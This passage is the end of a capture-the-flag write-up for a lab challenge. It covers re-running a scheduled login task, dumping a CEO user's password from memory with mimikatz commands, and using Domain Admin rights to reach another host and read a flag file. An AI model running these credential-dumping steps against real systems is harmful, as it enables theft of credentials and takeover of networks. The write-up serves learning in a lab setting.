</span></pre></table></code></div></div><p>After RDP into the machine, you may encounter a cmd window that appears for a few seconds and then disappers. I did not notice that at first and thought I hit a dead end by just using mimikatz. That turned out to be a task to perform the login of the <code class="language-plaintext highlighter-rouge">CEO</code> user so that I could retrieve the password from memory. It took me a while to figure that out. To trigger the action again, just go to Task Scheduler and run the action.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/27.PNG" alt="CEO-1" /></p><p>And then use mimikatz to get the passwords:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mimikatz# privilege::debug
mimikatz# sekurlsa::logonPasswords
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/28.PNG" alt="CEO-1" /></p><p>The flag is <code class="language-plaintext highlighter-rouge">GRIMM-memory-MAGIC</code>.</p><h2 id="top-of-the-food-chain-500pts">Top of the Food Chain (500pts)</h2><p>Now being the Domain Admin, I could just RDP again into the CEO machine. However I needed to figure out which machine was that in the first place. Open the DNS records, the CEO machine is at <code class="language-plaintext highlighter-rouge">10.123.14.122</code> and the hostname is <code class="language-plaintext highlighter-rouge">ceo</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/29.PNG" alt="TOP-1" /></p><p>Let’s RDP into that machine as the Domain Admin (yes, RDP inside RDP). The flag is at <code class="language-plaintext highlighter-rouge">C:\flag.txt</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/30.PNG" alt="TOP-2" /></p><p>The flag is <code class="language-plaintext highlighter-rouge">GRIMM-BIG-LEAGUE-HAXOR</code>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/pentest/'>pentest</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/pentest/" class="post-tag no-text-decoration" >pentest</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1"></span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GRIMM HAX Combined Challenge - ret2life&url=https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GRIMM HAX Combined Challenge - ret2life&u=https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=GRIMM HAX Combined Challenge - ret2life&url=https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="" title-succeed=""> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Google-CTF-2021/">Google CTF 2021 - Fullchain</a><li><a href="/posts/CSAW-CTF-17-Qual/">CSAW CTF 2017 Qualification</a><li><a href="/posts/AceBear-CTF-19/">AceBear CTF 19</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SANS-HHC-2017/"><div class="card-body"> <span class="timeago small" >Dec 16, 2017<i class="unloaded">2017-12-16T22:42:59+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>2017 SANS Holiday Hacking Challenge</h3><div class="text-muted small"><p> This year, I’ve had the chance to participate in SANS Holiday Hacking Challenge. The first time I did it was last year. I didn’t think it was interesting with real pentesting stuffs until I read th...</p></div></div></a></div><div class="card"> <a href="/posts/TetCTF-19/"><div class="card-body"> <span class="timeago small" >Jan 1, 2019<i class="unloaded">2019-01-01T14:34:45+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TetCTF 19</h3><div class="text-muted small"><p> This is my write-up for TetCTF 19 Web - IQTest2 (unsolved) Pwn - Easy webserver (unsolved) Pwn - Babysandbox Pwn - Babyheap Pwn - Babyfirst Web IQTest2 After looking at the s...</p></div></div></a></div><div class="card"> <a href="/posts/Insomnihack-teaser-CTF-2019/"><div class="card-body"> <span class="timeago small" >Jan 21, 2019<i class="unloaded">2019-01-21T08:21:38+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Insomnihack Teaser CTF 2019</h3><div class="text-muted small"><p> This is my exploit for the Onewrite challenge from Insomnihack Teaser CTF 2019. Onewrite - Pwn 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SANS-HHC-2017/" class="btn btn-outline-primary" prompt="Older"><p>2017 SANS Holiday Hacking Challenge</p></a> <a href="/posts/H1-702-CTF-2018/" class="btn btn-outline-primary" prompt="Newer"><p>H1-702 CTF 2018</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Duc Phan</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4"></h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/browser/">browser</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/radare2/">radare2</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/blue-team/">blue team</a> <a class="post-tag" href="/tags/ccdc/">ccdc</a> <a class="post-tag" href="/tags/chrome/">chrome</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WN0BSTHR4X"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WN0BSTHR4X'); }); </script>
